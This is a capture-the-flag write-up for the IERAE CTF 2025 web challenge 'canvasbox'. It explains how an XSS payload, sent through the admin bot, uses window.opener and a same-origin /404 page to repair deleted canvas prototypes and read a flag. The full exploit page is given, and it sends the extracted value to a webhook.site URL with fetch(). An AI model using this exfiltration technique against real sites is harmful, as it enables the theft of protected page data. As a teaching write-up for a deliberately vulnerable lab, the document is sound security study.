# Challenge details
Challenge name: canvasbox  
Competition: IERAE CTF 2025  
Category: Web  
Difficulty: Hard  
Points: 279  
Solves: 16  

# Challenge description
The flag is hidden in the canvas. You cannot access it, even with XSS...
Challenge: http://34.146.182.31:3000
Admin bot: http://34.146.19.165:1337

# About the challenge
Unfortunately, I was unable to solve this during the ctf, but I saw this very cool solution so I wanted to document it :)

The admin page allows users to provide a link that the bot will visit, in this case it will be http://web:3000/, which is where the challenge is hosted.

# TL;DR
 1. you make a page -> you give this page to the bot -> the bot visits web:3000 sets the flag there.
 2. web:3000 sets the flag as the canvas.getContext("2d").font = `1px "${flag}"`,breaks its prototypes, deletes window.open and some other weird stuff, the bot then visits your url.
 3. This will cause the bot to open a new web:3000 tab.
 4. Your payload then changes the origin from your attacking page to web:3000/404, and makes a working canvas.
 5. It then fixes the canvas on the web:3000 page.
 6. This is only possible because they are the same origin, and /404 page doesn't have the code that breaks stuff. 
 7. You then send the flag.getContext("2d").font to your webhook

# Source code
```js
    canvas.getContext("2d").font = `1px "${flag}"`;
```
The web page sets the flag under canvas.getContext("2d").font

```js
    const params = new URLSearchParams(location.search);
    const xss = params.get("xss") ?? "console.log(1337)";
    eval(xss);
```
the page also allows you to inject things into the xss parameter in the url which will get evaluated.

```js
try {
    const page1 = await context.newPage();
    await page1.goto(APP_URL, { timeout: 3_000 });
    await page1.evaluate((flag) => {
      localStorage.setItem("flag", flag);
    }, FLAG);
    await sleep(1_000);
    await page1.close();

    const page2 = await context.newPage();
    await page2.goto(url, { timeout: 5_000 });
    await sleep(5_000);
    await page2.close();
  } catch (e) {
    console.error(e);
  }
```
Looking at the code in bot.js, it tells us how the bot behaves.
It will first visit http://web:3000, and set the flag. Then it will visit the url that you gave to it.
BUT its not so simple
```js

delete window.open;
const removeKey = (obj, key) => {
    delete obj[key];
    if (key in obj) {
        Object.defineProperty(obj, key, {});
    }
};
for (const descriptor of Object.values(
    Object.getOwnPropertyDescriptors(window)
)) {
    const value = descriptor.value;
    const prototype = value?.prototype;

    if (prototype instanceof Node || value === DOMParser) {
        // Delete all the properties
        for (const key of Object.getOwnPropertyNames(value)) {
            removeKey(value, key);
        }
        for (const key of Object.getOwnPropertyNames(prototype)) {
            removeKey(prototype, key);
        }
    }
}
```
The web page does some funny stuff and deletes a lot of things, so we have to somehow get past that

## Create your payload + page
```js
<script>
  payload = `
    fetch("https://webhook.site/xxxxx?inner")
    window.opener.location = "http://web:3000/404"
    setTimeout(()=>{
        window.opener.document.write("<canvas id=ff></canvas>")
        Object.setPrototypeOf(flag, window.opener.document.getElementById("ff").__proto__);
        fetch("https://webhook.site/xxxxx?"+flag.getContext("2d").font)
    },1000);
  `
  window.open("http://web:3000/?xss=" + encodeURIComponent(payload))
</script>
<img src="https://webhook.site/xxxxx?ready" /> //this part is
// just to test if your webhook connection is working 
```
## What is going on??
The first step would be to host this page, you can use any hosting service, such as ngrok. Then you pass the url of this page to the bot.

Look at this timeline
| Step | What Happens                              | Who Controls It? |
|------|-------------------------------------------|------------------|
| 1️   | page1 loads http://web:3000               | BOT              |
| 2️   | Flag is stored in localStorage            | BOT              |
| 3️   | page1 is closed                           | BOT              |
| 4️   | page2 loads your page (https://your.exploit.page) | YOU       |
| 5️   | Your page opens a new window back to http://web:3000/?xss=... | YOU |
| 6️   | That window loads the challenge — still has the flag! | YES!!   |
| 7️   | Your payload runs and extracts the flag   | YOU              |


<br>

## Payload
```js
window.open("http://web:3000/?xss=" + encodeURIComponent(payload))
```
This will make the bot open a new tab for web:3000 with your payload
```js
fetch("https://webhook.site/xxxxx?inner")
```
The first line of the payload just alerts your webhook and you that it has connected
```js
window.opener.location = "http://web:3000/404"
```
This is CRUCIAL. window.opener will change the original page location (that had run windows.open). So initially window.opener.location is the page that you made. you change it to http://web:3000/404 so that it is
1. Same origin 
2. Doesn't have the funny restrictions that the page had set
```js
window.opener.document.write("<canvas id=ff></canvas>")
Object.setPrototypeOf(flag, window.opener.document.getElementById("ff").__proto__);
```
| Item                   | Exists Where?              | Purpose                                |
|------------------------|----------------------------|----------------------------------------|
| Canvas with flag       | /?xss=... (challenge page) | Holds the flag in `.font`              |
| Canvas on /404         | Created by you, dynamically| Source of clean `.getContext()`        |
| /404                   | Clean page                 | Supplies a clean, unbroken canvas prototype |
| `Object.setPrototypeOf`| In challenge page          | Swaps broken prototype with clean one  |

```js
fetch("https://webhook.site/xxxxx?"+flag.getContext("2d").font)
```
After you swap it you can just send the font to your webhook





